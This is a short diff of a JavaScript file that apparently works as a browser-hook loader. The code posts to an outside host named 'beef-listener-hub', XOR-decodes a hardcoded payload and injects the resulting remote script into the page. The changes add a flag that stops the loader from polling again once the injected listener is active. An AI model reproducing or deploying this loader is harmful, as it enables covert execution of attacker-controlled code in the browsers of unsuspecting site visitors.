@@ -1,6 +1,7 @@
 const key       = "my_secret_key";
 const origin = "https://beef-listener-hub.onrender.com";
 let status = "idle";
+let request = true;
 
 function xorDecode(encoded, key) {
   const text = atob(encoded);
@@ -23,6 +24,7 @@ function loadListenerScript(scriptUrl) {
 
   script.onload = () => {
     console.log("Listener script loaded:", scriptUrl);
+    request = (status === "active") ? false : true;
     status = "active";
   };
 
@@ -37,6 +39,7 @@ function loadListenerScript(scriptUrl) {
 function getListener() {
     async function fetchListener() {
         try {
+            if(!request) return;
             const response = await fetch(origin + "/api/route",
                 {
                     method: "POST",
